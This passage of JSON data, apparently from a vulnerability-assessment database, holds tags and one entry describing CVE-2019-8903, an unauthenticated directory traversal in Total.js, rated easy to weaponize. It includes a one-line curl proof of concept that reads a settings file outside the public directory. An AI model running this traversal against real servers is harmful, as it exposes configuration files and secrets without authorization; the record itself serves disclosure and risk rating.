          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "7bee533a-b1c7-45e0-a37a-cb92012507ba",
      "editorId": "1653ed71-2842-4eb4-9a31-4ffe808a393f",
      "topicId": "d1e7e4bf-380d-4ba0-87f6-75100c2b8ba2",
      "created": "2020-07-05T14:29:32.821186Z",
      "revisionDate": "2020-07-05T14:29:32.823192Z",
      "document": "__Totaljs - Unathenticated Directory Traversal__\r\n\r\n__DESCRIPTION__\r\nUser can make requests like \u201cGET /../databases/settings.json\r\nHTTP/1.1\u201d and include file contents from outside the /public\r\nthe directory which is the default directory for accessible static files.\r\n\r\n__Refer:-__\r\nhttps://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8903\r\n\r\n__PROOF OF CONCEPT__\r\n```\r\n$ curl -v --path-as-is\r\nhttp://127.0.0.1:8000/.%2e/databases/settings.json \r\n```\r\n#(note that .json is in the extensions list by def.)",
      "score": 1,
      "metadata": {
        "tags": [
          "pre_auth",
          "common_enterprise",
          "default_configuration",
          "easy_to_develop"
        ],
        "attacker-value": 3,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    }
  ]
}